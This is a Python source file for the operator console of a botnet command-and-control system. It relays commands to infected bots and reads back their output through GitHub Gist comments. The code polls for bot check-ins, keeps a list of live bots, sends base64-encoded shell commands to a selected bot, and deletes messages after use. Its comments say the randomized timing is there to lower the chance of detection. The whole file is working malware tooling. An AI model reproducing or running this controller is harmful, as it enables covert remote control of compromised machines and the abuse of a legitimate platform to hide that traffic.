import base64
import threading
from time import sleep, time
from github.GistComment import GistComment
from channel import Channel
import random


class Controller:
    def __init__(self, token: str, gist: str):
        self.channel = Channel(token, gist)
        self.active = True
        self.response_thread = threading.Thread(
            target=self.receive_responses, daemon=True
        )
        self.ping_thread = threading.Thread(target=self.ping_bots, daemon=True)
        self.last_ping = None

        self.bots = {}
        self.bots_lock = threading.Lock()

        self.selected_bot = None

        self.response_thread.start()
        self.ping_thread.start()
        self.wait_for_commands()

    def receive_responses(self):
        """
        Checks the channel for new responses from bots
        """
        while self.active:
            for new_response in self.channel.check_messages():
                self.handle_response(new_response)

            # Randomized sleep for a lesser chance of detection
            sleep(random.uniform(1.5, 5))

    def handle_response(self, response: GistComment):
        """
        Handles responses from bots
        :param response: the response to decode and process
        """
        response_footer = response.body[response.body.rfind("[") :]
        response_id = base64.b64decode(
            response_footer.split("(")[1].split(")")[0].encode("utf-8")
        ).decode("utf-8")

        bot_id = response_id.split("-")[1]
        command_id = int(response_id.split("-")[0])

        with self.bots_lock:
            if Channel.PING_RESPONSE in response.body:
                if not self.bots.get(bot_id):
                    self.bots[bot_id] = {}

                self.bots[bot_id]["last_ping"] = command_id

                self.channel.delete_message(response.id)

            elif Channel.BINARY_RESPONSE in response.body:
                bot = self.bots.get(bot_id)

                if bot and bot["commands"] and bot["commands"][command_id]:
                    stdout = base64.b64decode(
                        response.body[
                            response.body.find("(") + 1 : response.body.find(")")
                        ].encode("utf-8")
                    ).decode("utf-8")
                    print(f"\n{stdout}")
                    self.channel.delete_message(command_id)

                self.channel.delete_message(response.id)

    def ping_bots(self):
        """
        Pings all bots to check which bots are still alive.
        """
        while self.active:

            if self.last_ping:
                self.channel.delete_message(self.last_ping)

            with self.bots_lock:
                active_bots = {}

                for bot_id, bot in self.bots.items():
                    if bot["last_ping"] == self.last_ping:
                        active_bots[bot_id] = bot

                self.bots = active_bots

                if self.selected_bot not in self.bots:
                    self.selected_bot = None

                self.last_ping = self.channel.send_message(f"{Channel.PING_REQUEST}").id

            # Randomized sleep for a lesser chance of detection
            sleep(random.uniform(50, 70))

    def wait_for_commands(self):
        """
        Waits for user input and executes commands based on it
        """
        while self.active:
            input_str = input(f"({self.selected_bot if self.selected_bot else '*'})$ ")
            args = input_str.split(" ")

            if args[0].lower() == "exit":
                self.exit()
            elif args[0].lower() == "status":
                self.print_status()
            elif args[0].lower() == "list":
                self.print_bots()
            elif args[0].lower() == "bot":
                self.select_bot(args[1:])
            elif args[0].lower() == "exec":
                self.execute_command(args[1:])

    def exit(self):
        """
        Stops the controller console
        """
        self.active = False

        if self.last_ping:
            self.channel.delete_message(self.last_ping)

    def print_status(self):
        """
        Prints bot status (how many are still alive based on pings)
        """
        with self.bots_lock:
            # print(
            #     f"Bots currently online: {len([x for x, y in self.bots.items() if y['last_ping'] == self.last_ping])}"
            # )

            print(f"Bots currently online: {len(self.bots)}")

    def print_bots(self):
        """
        Prints all alive bots
        """
        with self.bots_lock:
            for bot_id in self.bots.keys():
                print(f"{bot_id}")

    def select_bot(self, args: list[str]):
        """
        Selects the bot to which following commands are sent
        :param args: Command arguments
        """
        if len(args) < 1:
            print("Invalid bot ID")
            return

        with self.bots_lock:
            bot_id = args[0]

            if bot_id in self.bots.keys():
                self.selected_bot = bot_id
            else:
                print("The given bot is invalid or the given bot is offline")

    def execute_command(self, args: list[str]):
        with self.bots_lock:
            if not self.selected_bot:
                print(
                    "No bot selected, sending arbitrary commands to all bots at once is not supported!"
                )
                return

            bot_id = base64.b64encode(self.selected_bot.encode("utf-8")).decode("utf-8")

            command = self.channel.send_message(
                f"{Channel.BINARY_REQUEST} [](<{base64.b64encode(' '.join(args).encode('utf-8')).decode('utf-8')}>) []({bot_id})"
            )

            bot = self.bots[self.selected_bot]

            if not bot.get("commands"):
                bot["commands"] = {}

            bot["commands"][command.id] = time()
